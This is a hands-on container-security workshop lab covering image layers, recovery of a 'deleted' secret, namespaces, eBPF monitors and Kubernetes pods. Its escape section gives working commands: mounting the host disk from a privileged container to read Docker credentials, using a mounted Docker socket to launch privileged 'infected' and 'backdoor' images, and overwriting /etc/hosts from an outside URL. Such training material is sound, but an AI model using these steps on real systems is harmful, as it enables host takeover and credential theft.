# Dissecting Containers and Pods

A hands-on lab that takes a container apart from the outside in. You will run
plain `nginx` containers, build your own images and pull them apart layer by
layer, discover where a running container actually lives on the host, walk
through the Linux primitives (namespaces, capabilities, cgroups) that make a
"container" a container, break out of a few deliberately misconfigured ones,
watch the kernel with eBPF tooling, and finish by applying the same ideas to
Kubernetes pods.

The goal is not to memorise commands but to build a mental model: **a container
is just a normal Linux process with a private view of the filesystem, network,
and process tree, assembled from stacked read-only image layers plus one
writable layer on top.** Once that clicks, both "how do I inspect it" and "how
do I escape it" stop being magic.

The lab is organised into five working directories that build on each other:

| Dir | Topic |
|------|-------|
| `lab1` | Build a first image (with a planted secret) |
| `lab2` | Layer a second image on top of the first |
| `lab3` | Dissect an image on disk and recover the secret |
| `lab4` | Dissect a *running* container's storage |
| `lab5` | Namespaces, capabilities, and container escapes |

> **A note on modern Docker.** Recent Docker Engine ships with the **containerd
> image store** enabled by default, and this lab assumes it. The change matters
> in two places you will hit below:
>
> - `docker inspect` no longer fills in the old `GraphDriver` block - it returns
>   `null`.
> - Image and container filesystem data moved out of `/var/lib/docker/overlay2/`
>   into the containerd snapshotter tree.
>
> Both the classic and the containerd behaviour are shown where they differ.
> Check which store you are on with:
>
> ```
> docker info | grep -iE 'storage|driver'
> ```
>
> `driver-type: io.containerd.snapshotter.v1` means the new containerd store;
> `Storage Driver: overlay2` means the classic one.

## 1. Running your first containers

### The Docker host

You need a Linux host you control - the lab was written for an Ubuntu VM with a
public IP and inbound TCP ports `80`, `443`, `8080`, and `8081` open in the
security group.

### Installing Docker

`jq` and `tree` are used throughout - `jq` to slice the JSON that `docker
inspect` emits, `tree` to visualise unpacked image layers. Install them first
(on a fresh host `tree` is usually **not** present):

```
sudo apt-get update
sudo apt-get install -y jq tree
```

Install Docker itself from the official convenience script:

```
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh ./get-docker.sh
```

Adding your user to the `docker` group lets you drop the `sudo` on every
command. Note that this is effectively **root-equivalent** - anyone in the
`docker` group can mount the host filesystem into a container, so treat group
membership as an administrative privilege.

```
sudo groupadd docker
sudo usermod -aG docker $USER
newgrp docker
```

### Starting two nginx containers

Each `docker run` below starts an nginx web server and publishes its internal
port `80` on a different host port. The two containers use different image tags
(`1.24` and `1.25`), so they also pull slightly different layers - handy later
when comparing digests.

```
export IP="x.x.x.x"
```
```
docker run -d -p 8080:80 --name www  nginx:1.24
docker run -d -p 8081:80 --name www2 nginx:1.25
```

Confirm both respond:

```
curl -kv $IP:8080
curl -kv $IP:8081
```

## 2. Building images

An image is a stack of read-only layers plus a small JSON config describing how
to run it. Every instruction in a `Dockerfile` that changes the filesystem
(`ADD`, `COPY`, `RUN`) produces a new layer. Layers are content-addressed and
shared between images, which is why the second image below reuses almost all of
the first one's bytes.

### Lab 1: Building the first image (with a planted secret)

> **Why this image is deliberately broken.** We `ADD` a secret into an early
> layer and then `rm` it in a later layer. At runtime the file *looks* gone -
> but because image layers are immutable, the secret is still sitting in the
> layer where it was added. We recover it in Lab 3. This mirrors a very common
> real-world mistake: baking a credential into a build and "removing" it in a
> later step, assuming that makes it disappear. It does not.

```
mkdir ./lab1
cd lab1
```
```
echo "My Annacon secret" > ./secret.txt
```
```
cat > Dockerfile <<EOF
FROM ubuntu:20.04
ADD ./secret.txt /secret.txt
RUN apt-get update && apt-get install -y curl netcat
RUN rm -f /secret.txt
CMD bash
EOF
```
```
docker build -t myimage ./.
```

Run the image interactively and poke around. Notice that the secret appears to
be gone from inside the running container - remember that when we recover it
from the layers later:

```
docker run -it myimage
```
```
# --- inside the container ---
hostname              # the container ID becomes the hostname
cat /secret.txt       # -> No such file or directory  (it looks deleted)
exit                  # leave the container
```

### Lab 2: Layering a second image on top

Here we build a new image *on top of* the first one. Because the build resolves
`FROM myimage` from your local image store, no registry or network access is
needed.

```
mkdir ../lab2
cd ../lab2
```
```
cat > Dockerfile <<EOF
FROM myimage
RUN apt-get update && apt-get install -y dnsutils tcpdump
CMD tcpdump -i any
EOF
```
```
docker build -t mytcpdumper ./.
```

This image's default command is `tcpdump`, so running it starts a live capture.
Let it print a few packets, then stop it with `Ctrl-C`:

```
docker run -it mytcpdumper
# ...tcpdump prints captured packets...
# press Ctrl-C to stop and exit
```

### (Optional) Publishing to a registry

Everything in this lab works with **locally built** images, so pushing to a
registry is entirely optional - do it only if you want to share images across
hosts. If you skip it, keep using the local `myimage` / `mytcpdumper` tags.

```
# optional - requires a Docker Hub (or other registry) account
docker tag  myimage xxradar/myimage:01
docker login
docker push xxradar/myimage:01

docker tag  mytcpdumper xxradar/mytcpdumper:01
docker push xxradar/mytcpdumper:01
```

## 3. Dissecting an image (lab3)

`docker save` serialises an image - all of its layers and metadata - into a
single tar stream. This is the offline, registry-free way to see exactly what
ships inside an image.

```
mkdir ../lab3
cd ../lab3
```
```
docker save myimage > image.tar
tar xvf ./image.tar
```

### Image on-disk format: classic vs OCI

The layout inside the tar depends on the image store, so look at what actually
landed:

```
tree .
```

- **Classic (overlay2) format:** a top-level `manifest.json`, one `<hash>.json`
  config, and one directory per layer, each containing a `layer.tar`.

- **Containerd / OCI format (modern default):** an `oci-layout` marker, an
  `index.json`, and a `blobs/sha256/` directory. *Every* blob - image config,
  manifest, and each layer - is a file named after its digest under
  `blobs/sha256/`. Config and manifest blobs are JSON; layer blobs are (usually
  gzip-compressed) tarballs. This is what you get on a current Docker install:

  ```
  cat index.json  | jq
  cat oci-layout  | jq
  ```

### Recovering the "deleted" secret

The lesson: the secret we "deleted" in the Dockerfile is still fully
recoverable, because it lives in the layer where it was `ADD`ed. Unpack every
layer into its own directory and search across all of them.

**Classic format** - each layer is a `layer.tar`:

```
for d in */ ; do
  [ -f "$d/layer.tar" ] && mkdir -p "extract/$d" && tar xf "$d/layer.tar" -C "extract/$d"
done
grep -Rl secret.txt ./extract/ 2>/dev/null
```

**Containerd / OCI format** - layers are blobs under `blobs/sha256/`. Not every
blob is a tar (config and manifest are JSON), so probe each one before
unpacking:

```
mkdir -p extract
i=0
for blob in blobs/sha256/* ; do
  # only unpack blobs that are actually tar archives
  if tar -tf "$blob" >/dev/null 2>&1 ; then
    i=$((i+1))
    mkdir -p "extract/layer_$i"
    tar -xf "$blob" -C "extract/layer_$i" 2>/dev/null
  fi
done
find ./extract -name secret.txt
```

On a containerd-store host this prints something like
`./extract/layer_4/secret.txt` - and the "deleted" secret is right there:

```
cat ./extract/layer_4/secret.txt
# -> My Annacon secret
```

> A ready-made helper script that handles both layouts (and can save the image
> for you) is a convenient one-shot - see the community `extract-image-blobs.sh`
> pattern, or just reuse the loops above.

### Scanning with Trivy

Unpacking layers by hand is great for understanding; in practice you run a
scanner. [Trivy](https://github.com/aquasecurity/trivy) reads the same layers,
matches installed packages against vulnerability databases, and can also flag
embedded secrets and misconfigurations. Install the **latest** release with the
official script (the old pinned `.deb` URLs 404 once a version ages out):

```
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh \
  | sudo sh -s -- -b /usr/local/bin
trivy --version
```

Scan the image for vulnerabilities:

```
trivy image myimage
```

Trivy can also catch the embedded secret we recovered above:

```
trivy image --scanners secret myimage
```

> Prefer not to install anything? Run Trivy straight from its container image:
> `docker run --rm aquasec/trivy:latest image myimage` (mount the Docker socket
> if you need it to reach locally built images).

## 4. Dissecting a running container (lab4)

So far we have looked at images - static, on-disk artefacts. A **running
container** is different: it is a live process with a merged root filesystem and
a set of kernel namespaces. Everything `docker inspect` prints comes from
querying that live process and its configuration.

```
mkdir ../lab4
cd ../lab4
```
```
docker inspect www
```

### Logs

`docker inspect` tells you where the daemon keeps the container's JSON-lines log
(the file that backs `docker logs`). It is owned by root:

```
docker inspect www | jq -r '.[].LogPath'
sudo tail "$(docker inspect www | jq -r '.[].LogPath')"
```

### Where the filesystem lives

This is where the classic and containerd stores diverge, and it is the single
most common source of "the tutorial doesn't match my machine" confusion.

**Classic (overlay2) store.** `docker inspect` fills in a `GraphDriver` block
pointing straight at the overlay directories; `UpperDir` is the writable layer:

```
docker inspect www | jq -r '.[].GraphDriver'
# classic store -> a JSON object with LowerDir / MergedDir / UpperDir
#                  under /var/lib/docker/overlay2/...

UPPER="$(docker inspect www | jq -r '.[].GraphDriver.Data.UpperDir')"
sudo ls -l "$UPPER"
```

**Containerd store (modern default).** Here `GraphDriver` is `null`, which is
exactly what you see on a fresh Docker install today:

```
docker inspect www | jq -r '.[].GraphDriver'
# containerd store -> null

docker inspect www | jq -r '.[].Driver'
# containerd store -> overlayfs   (the containerd overlayfs snapshotter)
```

Because the snapshot path is **not** exposed by `inspect`, read it straight from
the running process's mount table instead. The overlay mount lists `lowerdir`,
`upperdir`, and `workdir` - the `upperdir` is the writable layer:

```
PID="$(docker inspect www | jq -r '.[].State.Pid')"
sudo grep -w overlay /proc/$PID/mountinfo
```

Rather than hardcode a base path (it varies - Docker's bundled containerd uses
`/var/lib/docker/containerd/daemon/io.containerd.snapshotter.v1.overlayfs/...`,
while a host-level containerd uses
`/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/...`), pull the exact
`upperdir` out of `mountinfo` and use it directly:

```
UPPER="$(sudo grep -w overlay /proc/$PID/mountinfo | grep -o 'upperdir=[^,]*' | cut -d= -f2)"
echo "$UPPER"
# e.g. /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/22/fs
sudo ls -l "$UPPER"
```

### Proving that runtime writes land in the writable layer

Write a file inside the container, then find it on the host - two ways.

```
docker exec -it www bash
```
```
# --- inside the container ---
echo secretoftheday > /text.txt
exit
```

The simplest, store-agnostic route is through the process root
(`/proc/<PID>/root` is the container's merged filesystem seen from the host):

```
PID="$(docker inspect www | jq -r '.[].State.Pid')"
sudo cat /proc/$PID/root/text.txt
# -> secretoftheday
```

Or read it from the writable `upperdir` we extracted above:

```
sudo cat "$UPPER/text.txt"
# -> secretoftheday
```

The key takeaway: **runtime writes go only to the container's private writable
layer**, never back into the shared read-only image layers. That is why the
`text.txt` you just created shows up in the snapshot `upperdir` but would *not*
appear if you unpacked the image blobs - it was never part of the image.

If you just want the whole merged filesystem as one flat tarball, skip the
snapshot hunt entirely:

```
docker export www -o www-rootfs.tar
```

## 5. Processes, namespaces, and escapes (lab5)

### Namespaces

A container's isolation is built from Linux **namespaces**: separate views of
the process tree (`pid`), network stack (`net`), mounts (`mnt`), hostname
(`uts`), IPC, and more. From the host, each shows up as a numeric namespace ID
on the container's main process, and two processes sharing a namespace share the
same ID - so this is how you tell "who is in the same sandbox".

```
mkdir ../lab5
cd ../lab5
```
```
export PID=$(docker inspect www | jq -r '.[].State.Pid')
echo $PID
```
```
sudo ps -ax -n -o pid,netns,utsns,ipcns,mntns,pidns,cmd | grep $PID
```

Take the network namespace ID from that output and list everything sharing it -
you should see the container's processes grouped together:

```
export NETNS="4026532287"
sudo ps -ax -n -o pid,netns,utsns,ipcns,mntns,pidns,cmd | grep $NETNS
```

### Entering a container with nsenter

`nsenter` joins an existing set of namespaces by PID - the low-level equivalent
of `docker exec`, but it works directly against the kernel and does not depend
on the Docker CLI at all. Once inside, you are effectively a process in that
container:

```
sudo nsenter -t $PID -a
```
```
# --- inside the container's namespaces ---
apt-get update && apt-get install procps
ps aux
```

From here you have the container's network identity, so you can tamper with the
running nginx to prove you control what it serves:

```
curl https://www.radarhack.com/dir/demo/hosts.txt -o /etc/hosts
curl www.google.com
cat /usr/share/nginx/html/index.html
echo hacking at annacon >> /usr/share/nginx/html/index.html
# inside the container's netns nginx listens on port 80 (8080 was only the host mapping)
curl -kv 127.0.0.1:80
```

### Privileged containers

A `--privileged` container keeps almost all Linux capabilities and gets access
to host devices. That combination is enough to escape: the host's block devices
appear as `/dev` nodes inside the container, so you can mount the host root
filesystem and read (or write) anything on it - including credentials.

Start by listing the host's block devices and finding the one mounted at `/`.
On an AWS EC2 host that is `xvda` - the 30 GB EBS root disk - whose partition
`xvda1` carries the root filesystem. The `loop*` entries are just
squashfs-mounted snap packages and can be ignored:

```
lsblk
# NAME     MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
# xvda     202:0    0    30G  0 disk
# ├─xvda1  202:1    0  29.9G  0 part /            <-- host root filesystem
# ├─xvda14 202:14   0     4M  0 part
# └─xvda15 202:15   0   106M  0 part /boot/efi
# loop0 .. loopN   ...  squashfs  /snap/...       <-- snap packages, ignore
```
```
docker run -d --privileged --name www3 nginx:1.25
docker exec -it www3 bash
```

Inside the container, mount that root partition. The device path is
`/dev/<name>` taken from `lsblk` - here `/dev/xvda1`. Mind the `/dev/` prefix:
`mount /xvda/xvda1 ...` fails with *"special device does not exist"*. The exact
name is platform-dependent: `/dev/xvda1` on AWS EC2, often `/dev/vda1` on
KVM/OpenStack, `/dev/sda1` on bare metal:

```
# --- inside the privileged container ---
mkdir /tmp/host-fs
mount /dev/xvda1 /tmp/host-fs/     # use the device lsblk showed mounted at "/"
```

Now the entire host filesystem is under `/tmp/host-fs`. A classic prize is the
Docker client config, which can hold registry credentials:

```
cd /tmp/host-fs/
# cat /tmp/host-fs/root/.docker/config.json
# cat /tmp/host-fs/home/ubuntu/.docker/config.json
```

> **Takeaway:** never run untrusted workloads with `--privileged`. It is not a
> "slightly stronger" container - it is effectively root on the host.

### Mounting the Docker socket

Mounting `/var/run/docker.sock` into a container hands that container full
control of the Docker daemon - and therefore the host. Anything that can talk to
the socket can launch new containers, including privileged ones that mount the
host filesystem. This is one of the most common real-world misconfigurations.

```
docker run -d -v /var/run/docker.sock:/var/run/docker.sock --name www4 nginx:1.25
docker exec -it www4 bash
```

Download a static Docker client and point it at the mounted socket - from here
you are effectively the host's Docker daemon:

```
# --- inside www4 ---
curl https://download.docker.com/linux/static/stable/x86_64/docker-24.0.6.tgz -O
tar xzvf ./docker-24.0.6.tgz
cd docker
./docker -H unix:///var/run/docker.sock ps
./docker -H unix:///var/run/docker.sock run -d --name hackpod xxradar/hackon sleep 900
./docker -H unix:///var/run/docker.sock run -d --privileged --name hackpodpriv \
  xxradar/ubuntu_infected:annacon sleep 500 &
./docker -H unix:///var/run/docker.sock run -d --privileged \
  -v /var/run/docker.sock:/var/run/docker.sock --name hackpod_backdoor \
  xxradar/ubuntu_infected:annacon "bash -c sleep 500 &"
```

### Host PID and host network

Sharing the host PID namespace (`--pid host`) drops process-tree isolation: the
container can see - and, with the right capabilities, signal or inspect - every
process on the host.

```
docker run -it --rm --pid host xxradar/hackon
```

`--net host` removes network isolation entirely: the container shares the host's
interfaces and localhost, so any service bound to `127.0.0.1` on the host is now
reachable from the container - often exposing admin endpoints assumed to be
host-only.

```
docker run -it --rm --net host xxradar/hackon
```

### Notes - capabilities and mounts

A few more tools for poking at a container's mounts and capabilities. Most need
a target PID, so grab one first (here, the `www` nginx container from the
earlier labs) - otherwise `findmnt -N` fails with *"option requires an
argument"* and `/proc//mountinfo` does not exist:

```
PID=$(docker inspect www | jq -r '.[].State.Pid')
```

Inspect that process's mount table. `findmnt` takes the PID as the argument to
`-N`; `/proc/<PID>/mountinfo` is the raw source it reads:

```
findmnt -N "$PID"
sudo cat /proc/$PID/mountinfo
```

The `filecap` / `pscap` / `netcap` tools report file and process capabilities,
but they are **not installed by default** - they live in `libcap-ng-utils`
(while the `getcap` / `setcap` pair lives in `libcap2-bin`):

```
sudo apt-get install -y libcap-ng-utils libcap2-bin
```
```
pscap                        # capabilities of running processes
sudo filecap /usr/bin/ping   # file capabilities on a binary (e.g. cap_net_raw)
sudo filecap -a 2>/dev/null  # sweep every file capability on the host
getcap /usr/bin/ping         # same idea, via libcap2-bin
```

Finally, the sysctl that decides which ports count as "privileged". The default
is `1024`, so binding below it needs `CAP_NET_BIND_SERVICE`; lowering this value
lets unprivileged processes bind low ports:

```
sysctl net.ipv4.ip_unprivileged_port_start   # -> 1024 by default
ls -la /proc/sys/net/ipv4/
```

See also [`genuinetools/amicontained`](https://github.com/genuinetools/amicontained)
for a one-shot "what can this container do" report.

## 6. Watching the kernel with eBPF

Everything above inspects containers from user space. **eBPF** lets you observe
(and enforce policy on) container behaviour from *inside the kernel* - syscalls,
network connections, process execution - with very low overhead. The three tools
below are runtime security/observability agents built on eBPF. They run
privileged and share host namespaces because they need kernel-wide visibility.

### Tracee

Aqua's Tracee traces syscalls and security events across the whole host:

```
docker run --name tracee --rm -it \
   --pid=host \
   --cgroupns=host \
   --privileged \
   -v /etc/os-release:/etc/os-release-host:ro \
   aquasec/tracee:latest
```

> On cloud kernels (e.g. AWS EC2) Tracee logs a warning like *"KConfig: could
> not check enabled kconfig features ... /boot/config-$(uname -r): no such file
> or directory"*. This is harmless - those images simply don't ship the kernel
> config in `/boot`, so Tracee falls back to assumed values and keeps tracing.
> If the file does exist on your host, mount it to silence the warning:
> `-v /boot/config-$(uname -r):/boot/config-$(uname -r):ro`.

### Falco

Falco matches kernel events against a rule set and alerts on suspicious
behaviour. Install it, then load a tiny rule that fires whenever a process is
spawned inside a container named `falco-test`:

```
curl -s https://falco.org/repo/falcosecurity-packages.asc | sudo apt-key add -
echo "deb https://download.falco.org/packages/deb stable main" \
  | sudo tee -a /etc/apt/sources.list.d/falcosecurity.list
sudo apt-get update -y
sudo apt-get install -y falco
```

Modern Falco (0.44+) uses a `modern_ebpf` probe, which brings two prerequisites
you will hit on a busy cloud host:

- **Run it as root.** As a normal user the probe fails with `libpman: ring
  buffer map type is not supported (Operation not permitted)` - the eBPF ring
  buffer needs privileges. Use `sudo`.
- **Raise the inotify limits.** Falco watches its config via inotify; if the
  host's limits are exhausted you get `Failed to allocate directory watch: Too
  many open files` / `could not initialize inotify handler`. Bump them:

```
sudo sysctl -w fs.inotify.max_user_instances=8192
sudo sysctl -w fs.inotify.max_user_watches=524288
```

Save the rule to `falco.rule`:

```
- rule: spawned_process_in_test_container
  desc: A process was spawned in the test container.
  condition: container.name = "falco-test" and evt.type = execve
  output: "%evt.time,%user.uid,%proc.name,%container.id,%container.name,command=%proc.cmdline"
  priority: WARNING
```

Run Falco with just this rule (as root). The `-r` flag loads only your file, so
the default ruleset is intentionally left out for this demo:

```
sudo falco -r ./falco.rule
```

In another terminal, trigger it by spawning a process inside a container named
`falco-test`. Falco should immediately print a `WARNING` line for the `execve`:

```
docker run --rm --name falco-test alpine sh -c 'echo hello from falco-test; sleep 2'
```

### Tetragon

Cilium's Tetragon does both observability *and* enforcement. First, just watch
events:

```
docker run -d --name tetragon-container --rm --pull always \
    --pid=host \
    --cgroupns=host \
    --privileged \
    -v /sys/kernel/btf/vmlinux:/var/lib/tetragon/btf \
    quay.io/cilium/tetragon-ci:latest
```
```
docker exec tetragon-container tetra getevents -o compact
```

Now a **TracingPolicy** that not only reports but actively kills any `curl`
process attempting to connect anywhere outside loopback - a concrete example of
in-kernel enforcement:

```
cat > ./tracing_policy.yaml <<EOF
# This tracing policy 'connect-only-local-addrs' will report attempts
# to make outbound TCP connections to any IP address other than those
# within the 127.0.0.0/8 CIDR, from the binary /usr/bin/curl. In
# addition it will also kill the offending curl process.
#
# In production, this could force processes to only connect to their
# side cars on their local loopback, and to treat transgressions as
# evidence of malicious activity, resulting in the process being killed.

apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "connect-only-local-addrs"
spec:
  kprobes:
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchArgs:
      - index: 0
        operator: "NotDAddr"
        values:
        - "127.0.0.0/8"
      matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/curl"
      matchActions:
      - action: Sigkill
EOF
```
```
docker run -d --name tetragon-container --rm --pull always \
    --pid=host --cgroupns=host --privileged \
    -v $PWD/tracing_policy.yaml:/tracing_policy.yaml \
    -v /sys/kernel/btf/vmlinux:/var/lib/tetragon/btf \
    quay.io/cilium/tetragon-ci:latest \
    --tracing-policy /tracing_policy.yaml
```

## 7. From containers to pods (Kubernetes)

Kubernetes builds on the exact same primitives. A **pod** is a group of
containers that *share* some namespaces - most notably the network namespace (so
they share an IP and can talk over `localhost`) and any declared volumes - while
keeping separate mount and (by default) PID namespaces. The "pause" container
you will see on the node is what holds those shared namespaces open.

### Create a multi-container pod

This pod runs nginx and redis side by side, sharing an `emptyDir` volume mounted
at a different path in each container - a minimal illustration of how sidecars
share storage:

```
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: mcpod
spec:
  volumes:
  - name: demo
    emptyDir: {}
  containers:
  - name: nginx
    image: nginx
    volumeMounts:
    - name: demo
      mountPath: /demo
  - name: redis
    image: redis
    volumeMounts:
    - name: demo
      mountPath: /data
EOF
```
```
kubectl get pod mcpod -o wide
```

### Finding the container PIDs on the node

`kubectl` deals in Kubernetes objects, but to inspect namespaces you need the
**host PID** of each container's process. The `kubectl get ... -o wide` above
shows which node the pod landed on - SSH to that node for the rest.

Kubernetes talks to the container runtime through the CRI, so on a containerd
node use `crictl`. Point it at the containerd socket if it is not already set in
`/etc/crictl.yaml`:

```
export CONTAINER_RUNTIME_ENDPOINT=unix:///run/containerd/containerd.sock
```

Start from the **pod sandbox** - the `pause` container that owns the shared
namespaces the app containers join:

```
SANDBOX=$(sudo crictl pods --name mcpod -q)
sudo crictl inspectp "$SANDBOX" | jq '.info.pid'   # PID of the pause container
```

Then the application containers. `crictl inspect ... | jq '.info.pid'` gives the
host PID of each:

```
sudo crictl ps --pod "$SANDBOX"                    # list the pod's containers
NGINX_PID=$(sudo crictl inspect "$(sudo crictl ps --pod "$SANDBOX" --name nginx -q)" | jq -r '.info.pid')
REDIS_PID=$(sudo crictl inspect "$(sudo crictl ps --pod "$SANDBOX" --name redis -q)" | jq -r '.info.pid')
echo "nginx=$NGINX_PID redis=$REDIS_PID"
```

Or read every container PID straight from containerd's Kubernetes namespace:

```
sudo ctr -n k8s.io tasks ls        # each task (container) listed with its PID
```

With those PIDs, the same namespace inspection from Lab 5 applies. Confirm that
nginx and redis **share the network namespace** (same `netns`) but keep
**separate mount namespaces** (different `mntns`):

```
sudo ps -ax -n -o pid,netns,utsns,ipcns,mntns,pidns,cmd | grep -E "$NGINX_PID|$REDIS_PID"
```

The pause container, nginx, and redis should all show the same `netns` value,
while each has its own `mntns` - exactly the "shared network, private
filesystem" model that defines a pod.

## Wrapping up

If you worked through all five labs, the "magic" should be gone. A container is
just a Linux process the kernel has given a private view of the world -
namespaces slice up what it can see, cgroups cap what it can use, and capabilities
decide what it can do, all layered on a copy-on-write filesystem stacked from
immutable image layers plus one writable top. Everything we did was a
consequence of that: secrets survive in the layer where they were added, runtime
writes land only in the upper snapshot, and a single loosened flag -
`--privileged`, a mounted Docker socket, `--pid host` - collapses the isolation
back into full host access. Kubernetes changes none of the fundamentals; a pod
is simply a set of these processes deliberately sharing some namespaces. Carry
that model with you: whether you are hardening an image, scoping a deployment, or
threat-modelling a cluster, the questions are always the same - what does this
process share, what can it reach, and what would it take to break out.
